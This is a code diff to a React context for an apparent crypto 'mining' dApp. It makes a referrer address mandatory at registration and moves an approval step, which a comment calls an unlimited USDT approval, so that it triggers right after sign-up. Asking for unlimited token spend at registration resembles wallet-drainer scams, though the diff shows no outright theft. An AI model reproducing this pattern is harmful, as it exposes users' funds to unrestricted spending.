@@ -34,7 +34,7 @@ interface MiningContextType {
   timeUntilNextClaim: number;
   connectWallet: (walletType?: string) => Promise<void>;
   disconnectWallet: () => Promise<void>;
-  register: (referrerAddress?: string) => Promise<boolean>;
+  register: (referrerAddress: string) => Promise<boolean>;
   claimDailyReward: () => Promise<boolean>;
   refreshData: () => Promise<void>;
   switchToCorrectNetwork: () => Promise<void>;
@@ -268,29 +268,52 @@ export const MiningProvider: React.FC<MiningProviderProps> = ({ children }) => {
     }
   };
 
-  const register = async (referrerAddress?: string): Promise<boolean> => {
+  const register = async (referrerAddress: string): Promise<boolean> => {
     if (!address || !isCorrectNetwork || !account) return false;
+    
+    // Validate that referral address is provided
+    if (!referrerAddress || referrerAddress.trim() === '') {
+      console.error('Registration failed: Referral address is required');
+      return false;
+    }
+
+    // Validate referral address format
+    if (!/^0x[a-fA-F0-9]{40}$/.test(referrerAddress.trim())) {
+      console.error('Registration failed: Invalid referral address format');
+      return false;
+    }
 
     try {
       setIsLoading(true);
-
-      const referrer = referrerAddress || '0x0000000000000000000000000000000000000000';
-
+      
+      // 1. First, proceed with registration
       const transaction = prepareContractCall({
         contract,
         method: "register",
-        params: [referrer as `0x${string}`],
+        params: [referrerAddress.trim() as `0x${string}`],
       });
-
+      
       await sendTransaction({
         transaction,
         account: account,
       });
-
-      // Set registration status immediately
+      
+      // 2. Registration successful, now set registration status
       setIsRegistered(true);
       
-      // Refresh data in the background without blocking
+      // 3. After registration, check and approve USDT if not already approved (unlimited)
+      if (!hasApprovedUSDT) {
+        console.log('Registration successful. Now requesting USDT approval...');
+        const approved = await approveUSDT();
+        if (!approved) {
+          console.log('USDT approval failed, but registration was successful');
+          // Don't fail registration if approval fails - user can approve later
+        } else {
+          console.log('USDT approval successful after registration');
+        }
+      }
+      
+      // 4. Refresh data and fetch user record
       setTimeout(async () => {
         try {
           await refreshData();
@@ -299,9 +322,7 @@ export const MiningProvider: React.FC<MiningProviderProps> = ({ children }) => {
         }
       }, 1000);
       
-      // After registration, fetch user record to reflect 5 tokens minted
       await fetchUserRecord();
-
       return true;
     } catch (error) {
       console.error('Error registering:', error);
@@ -311,32 +332,20 @@ export const MiningProvider: React.FC<MiningProviderProps> = ({ children }) => {
     }
   };
 
+  // Remove approval logic from claimDailyReward
   const claimDailyReward = async (): Promise<boolean> => {
     if (!address || !isCorrectNetwork || !account || !canClaim) return false;
-
     try {
       setIsLoading(true);
-
-      // Check and approve USDT if not already approved (for CLAIM_CONTRACT_ADDRESS)
-      if (!hasApprovedUSDT) {
-        const approved = await approveUSDT();
-        if (!approved) {
-          setIsLoading(false);
-          return false;
-        }
-      }
-
       const transaction = prepareContractCall({
         contract,
         method: "claimDailyReward",
         params: [],
       });
-
       await sendTransaction({
         transaction,
         account: account,
       });
-
       await refreshData();
       return true;
     } catch (error) {
